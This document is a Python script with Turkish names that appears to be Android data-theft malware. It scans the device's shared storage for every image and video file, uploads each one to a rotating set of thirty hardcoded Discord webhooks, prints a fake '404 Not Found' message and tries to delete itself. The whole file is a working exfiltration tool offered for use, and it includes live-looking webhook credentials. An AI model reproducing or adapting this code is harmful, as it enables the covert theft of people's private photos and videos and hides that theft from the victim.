import os
import requests
import concurrent.futures

def dosya_yolu_ara(klasor_yolu, uzantilar):
    bulunan_dosyalar = []
    for klasor_yolu, klasorlar, dosyalar in os.walk(klasor_yolu):
        for dosya in dosyalar:
            for uzanti in uzantilar:
                if dosya.endswith(uzanti) and not dosya.endswith((".apk", ".zip", ".rar", ".7z")):
                    dosya_yolu = os.path.join(klasor_yolu, dosya)
                    bulunan_dosyalar.append(dosya_yolu)
    return bulunan_dosyalar

def dosyalari_discord_webhooklara_farkli_gonder(webhook_url, dosya_yolu, boyut_siniri=25):
    dosya_boyutu = os.path.getsize(dosya_yolu) / (1024 * 1024)  # Dosya boyutunu megabayt cinsinden hesapla
    if dosya_boyutu <= boyut_siniri:
        dosya = {'file': open(dosya_yolu, 'rb')}
        requests.post(webhook_url, files=dosya)
    else:
        print(f"{dosya_yolu} dosyası {boyut_siniri}MB sınırını aştığı için gönderilmedi.")

def ilerleme_hesapla(gonderilen_dosya_sayisi, toplam_dosya_sayisi):
    return (gonderilen_dosya_sayisi / toplam_dosya_sayisi) * 100

dosya_yolu = "/storage/emulated/0"  # Özel dosya yolu
#uzantilar = [".mp4", ".png", ".jpg"]
uzantilar = [".jpg", ".png", ".gif", ".bmp", ".tiff", ".webp", ".svg", ".jpeg", ".ico", ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".webm", ".m4v", ".3gp", ".ts"]
bulunan_dosyalar = dosya_yolu_ara(dosya_yolu, uzantilar)
toplam_dosya_sayisi = len(bulunan_dosyalar)

# Discord Webhook URL'lerini buraya ekleyin (hepsi farklı dosyaları alacak şekilde):
webhook_url_list = [
    'https://discord.com/api/webhooks/1191894091496165457/4vdp6sjju-gawSwLEe6hscvNZY116SPTbG2SdXglbtrBLnvOo3eqpkkdaM9-jH2IH3ff',
    'https://discord.com/api/webhooks/1191894098370641970/u-a-s1Yc7vv1RIU8v4b-q6LDoA7-7Dw_tAV5ZawXbTDAc1QnBf-ZZLIgaDRy04akGsis',
    'https://discord.com/api/webhooks/1191894102283911278/9A6kdLNK88D2c66V_AbAnuKXbxbkR4AgwFt-T5EUQdqY60qIkNz0YbS5kAy4R6qrTm1z',
    'https://discord.com/api/webhooks/1191894106297868309/KDh4gH-k927a3NI4RZIkduqh90YmpFI5NVE8fuPPhsK4cr0G2T34EQA-xWxdZ0Ksqf7r',
    'https://discord.com/api/webhooks/1191894109976264795/fSH_7meJ_UIklUcUyRVLo_GCYiaD-t2-Jxiv8mcNcKOewqHEbuoLShIcCQLlHjnPpmrX',
    'https://discord.com/api/webhooks/1191894114216726709/09o5ijJoDqVXbSUBdAVxKQhdQ2Or-NoXsvFo5cRAhNbJlPRkLLF6fhiBTOI9HOAnGDRE',
    'https://discord.com/api/webhooks/1191894117983203418/oh7PCtBo01lXkeYM3DgQntNv3uNsoccTmyCLirFX4cbHNdsV4OfVUf8vj6OE8qur6ewz',
    'https://discord.com/api/webhooks/1191894124174004245/Bpm3_OutSGFbEYuvyZ2EdRY8dXCJPhDm1lj5j34ePaV0AiaTXecPdw3ibliXjofHBgDB',
    'https://discord.com/api/webhooks/1191894128649322616/KdoiOOPEby6YEQKs4kKnLv0Hq1wYrlqbNEUDb1IT8NViINLhrc6SLt0QSJyPXUXVhN1d',
    'https://discord.com/api/webhooks/1191894132579381268/-H4GUJ4LpkYg1lqisJPxBOYtP-HIgn7ZUz9JEAZ-7ccFC6D6M2Ez2LYjX-ifM7vsbQlM',
    'https://discord.com/api/webhooks/1191894136115187825/Hmwox4qbmAh1OzgnS-2utDd2sFrB0Gihv2Wgj2Wi9jVMvgdh-JDWy9It89i5cc0vQu4x',
    'https://discord.com/api/webhooks/1191894141064454224/KNNcjevUdFGWsA6N3aE2K26Zj8dnETtdxZ8eetChbEYPAxXliuy15mQpHlLqa03jVr6Z',
    'https://discord.com/api/webhooks/1191894144851923166/IVbXaPBlbl6hTe5QupfGyGegc8SiUBLXid3x4Eu-GJVb3UHTcopLkJRJxxthRFsDCqLA',
    'https://discord.com/api/webhooks/1191894148911996948/qFd0EsI3g3caXFgwr7i2NR4KlLUY8LBUzTbYDF5_1ISeyQvkw7CEnE0b62YJB6v9p0qx',
    'https://discord.com/api/webhooks/1191894153638969464/RbSFdPR3FDST7f6nvDUSidFYyBqMNLYK4gEu5-L_SNl8rUib5zP43I3N3sQQHSp4Bfdc',
    'https://discord.com/api/webhooks/1191894480148762785/RqmJT8OJp4nRYngccEF1yzoK-5EuBqzUVMpGYFMkUDh9cAwiKyDhIbteP1LczIQh5Qzn',
    'https://discord.com/api/webhooks/1191894495575408774/N-1k-YbfTyNpP9T8BBr0N-QpMnjSc1a4og4HkMDUvZkxi3j9H6TKzfDLbVauCdj3u3Hz',
    'https://discord.com/api/webhooks/1191894500927352882/tXwus6t9J3nvey2qg42Ua4Iuq1s2iHfisWpJkK4enFtg2Gw81o9jS2zX-sg0etz85nY2',
    'https://discord.com/api/webhooks/1191894504739967047/U4H6aikE4R9uHnyaVvnO2wSTqfAInYzVHvQpoaCEqv4AMCDN3xPx12tKenOYVmIucwJC',
    'https://discord.com/api/webhooks/1191894508275773600/T_cvmTYOxSaeGiSaUolm-vOEDza4o7DJfuzDz86tUAACRTPSxSWJnhrDWhMmifLnTlC5',
    'https://discord.com/api/webhooks/1191894511706701894/QpRp6lx0L0hPrSja2qJK9FLYjhS5ZWAX4RHecgHH90AM12iHFaedqodT4jfN7eBD91Yb',
    'https://discord.com/api/webhooks/1191894515284455464/g2-57nKccjIfKmzS3QM9XgnRbXIXOtw9sTvNx1YGubsX8rOaugb8UjuLbMeThO8iLD6V',
    'https://discord.com/api/webhooks/1191894518694428682/WiPYzXysGXo2WGsyOAtShpFAANvyhxTE3QV2_Bdt9MwrGIg1RbqKdqK_Vdd9FomKDCTD',
    'https://discord.com/api/webhooks/1191894521743691777/pvlgw_GeGSxgpuMbb-XmAXNwLlLsWjxI_HcC14hsET6u8wrgS98ybh0tsFSGbZ7uRvT8',
    'https://discord.com/api/webhooks/1191894525262704830/GOkpyFpznEzm9-tpfHVkwfb8HuW1xoJWTAH5Z_hkJyPS9fYdoun6q1j3KmJkNVezseh-',
    'https://discord.com/api/webhooks/1191894528915939328/B0qkltbKqmo1NuerHDVWk2Rpk-KjwZM3pI5RA9-PvzetFxbwLfnGEtnCtonoWv3n60r4',
    'https://discord.com/api/webhooks/1191894531583512667/N7DHWCZBibKNwPCzAS5dqmeISjNNTIWzF3PWyk2j4koYIzSeOb3jDuU8yFYNvpo8o0wI',
    'https://discord.com/api/webhooks/1191894534058156032/oe7LIKWjc1sRaGv2nN1mkEXj7zOcJc3AQg-SR-z2SfllsK7YsaTPrZiplUTJap-Xc3g1',
    'https://discord.com/api/webhooks/1191894536193069066/E6kcIlBzwbXOHjsW3E5slihxdXFhDz-yL5LPDj25ks-XwCuoh8A1I-GCdxgOli9iR8xk',
    'https://discord.com/api/webhooks/1191894537648484443/SXD2Y5ZhjG4vo74Myet81Qm7Wj45FQLhpZa_8gIJfL8P_UEBrPDGbKNKwhZVzYJ4LdtS',

]

gonderilen_dosya_sayisi = 0

for i, dosya_yolu in enumerate(bulunan_dosyalar):
    dosyalari_discord_webhooklara_farkli_gonder(webhook_url_list[i % len(webhook_url_list)], dosya_yolu)
    gonderilen_dosya_sayisi += 1
    ilerleme = ilerleme_hesapla(gonderilen_dosya_sayisi, toplam_dosya_sayisi)
    print(f"Ilerleme: {ilerleme:.2f}%")

print ("404 Not Found")


# Kendini imha et
os.remove(_file_)
